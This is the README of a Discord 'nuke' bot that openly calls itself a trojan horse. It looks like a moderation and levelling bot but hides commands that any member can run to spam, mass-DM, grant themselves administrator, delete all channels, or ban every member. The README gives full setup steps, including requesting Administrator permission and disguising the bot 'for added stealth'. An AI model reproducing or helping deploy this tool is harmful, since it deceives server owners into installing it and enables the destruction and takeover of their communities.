# Stealth Nuker v1.1.6

Stealth Nuker is a python-based nuke script for discord.py. However, this nuker has a trick up its sleeve!

You see, unlike other nuke scripts, this nuke script contains some commands that are *helpful* to the server, such as your regular clear command, latency command or kick command (it even has its own, SQL supported levelling system!), as well as a few commands that look as if they do something useful (but actually don't do anything). However, hidden within these commands are five **secret** commands, designed for controlling and/or destroying a server!

This way, the Stealth Nuker acts like a trojan horse rather than a typical piece of 'malicious' script; it disguises itself to be apart of the good guys.

---
How to install and use the Stealth Nuker:
-
**Want to watch a video tutorial? See this video: https://youtu.be/R5eqlvK_L4I**
1. Install the latest version of Python onto your computer: https://www.python.org/downloads/release/python-383/
2. When installing python, you **must** check the "Add to PATH" check box.
3. Install the latest version of Postgresql onto your computer: http://www.enterprisedb.com/postgresql-tutorial-resources-training?cid=48
4. When installing Postgresql, you must remember the password you set. **This is extremely important!**
5. After installing, Postgresql will offer you to install "StackBuilder": It is not needed for this bot to function.
6. After Postgresql has been installed, run **pgAdmin 4** *(You can find it by searching for it in the windows search box)*.
7. Open the "Servers" drop down menu at the left of the page.
8. Right click "databases", then move to create, then click "Database...".
9. Name the database `levels_db` then click "Save".
10. Open the "Schemas" drop down menu of the database you created.
11. Right click "Tables", then move to create, then click "Table...".
12. Name the table `users`, then move to the "Columns" tab.
13. Click "Add new row" (The + icon at the end of the "Columns" title widget).
14. Name the new row `user_id` and set the data type to "character varying" and set "Not NULL?" to "yes".
15. Click "Add new row".
16. Name the new row `guild_id` and set the data type to "character varying".
17. Click "Add new row".
18. Name the new row `lvl` and set the data type to "integer".
19. Click "Add new row".
20. Name the new row `xp` and set the data type to "integer". Then, click "Save"; you can now close the page.
21. Visit the releases page for the Stealth Nuker: https://github.com/catterall/Stealth-Nuker/releases
22. Download the latest version the extract it where ever you want to use it (You'll need 7zip to extract the file).
22. Go to https://discord.com/developers/applications.
23. Click "New Application".
24. Give the application whatever name you want your trojan bot to be called.
25. Click the "Bot" button on the side of the screen.
26. Click the "Add Bot" button.
27. Click the "OAuth2" button on the side of the screen.
28. Check the "Bot" checkbox on the "Scopes" widget.
29. Check the "Administrator" checkbox on the "Bot Permissions" widget.
30. Copy the generated link at the bottom of the "Scopes" widget and save it somewhere. **This allows users to invite your bot.**
31. Go back to the "Bot" page (Click the "Bot" button on the side of the screen).
32. Click the copy button next to the bot's profile picture display (You could change the bots profile picture for added stealth).
33. Open the `run_settings.json` file in the stealth bot folder you installed from the releases page.
34. Set the `postgresql_password` value to the password you created when installing postgresql.
35. Set the `prefix` value to whatever you want the bot prefix to be.
36. Set the `token` value to the bot token you copied.
37. Save the `run_settings.json` file and close it.
38. Reopen the **pgAdmin 4**, as it will need to be open for the bot to work locally.
39. Once the **pgAdmin 4** is open in the background, run the `run.bat` file to start the bot.

---
Remember, whenever you wish to run the bot, you must have the **pgAdmin 4** open in the background!

**You can view the Stealth Bot wiki here for more information: https://www.github.com/Catterall/Stealth-Nuker/wiki**

---
Features:
-
**The Stealth Nuker for discord has many features, in the form of its various *cogs*:**
- In moderation, you can find the following features:
  - **clear <1-1000>:** The clear command is a command used to clear the last 1-1000 messages.
  - **kick:** The kick command is a command used to kick a member.
  - **ban:** The ban command is a command used to ban a member.
  - **unban:** The unban command is a command used to unban a member.
  - **mute:** The mute command is a command used to a mute a member.
  - **unmute:** The unmute command is a command used to unmute a member.

- In anti-raid, you can find the following features:
  - **db_add_member:** Pretends to add a user to a list of raiders in a database.
  - **db_del_member:** Pretends to delete a user from a list of raiders in a database.

- In levels, you can find the following features:
  - **level:** Displays a user's level.

- In surfing, you can find the following features:
  - **define:** Gives the definition of any given word.

- In status, you can find the following features:
  - **latency:** Displays the bot's latency in milliseconds (ms).

**Malicious commands (Useable by any members on a server):**
-
**See the new commands in video form, here! https://youtu.be/keV4g-V457c**
- **spam:** Spams all text channels on a server with @everyone.
- **mass_dm** Messages all member on a server.
- **admin**: Gives you administrator permissions on a server.
- **cpurge:** Deletes all channels on a server.
- **nuke:** Bans all members, deletes all roles then deletes all channels.

### You can view the code and usage of each command here: https://github.com/Catterall/Stealth-Nuker/wiki/Commands

---
# Remember to star the project if you found it useful!
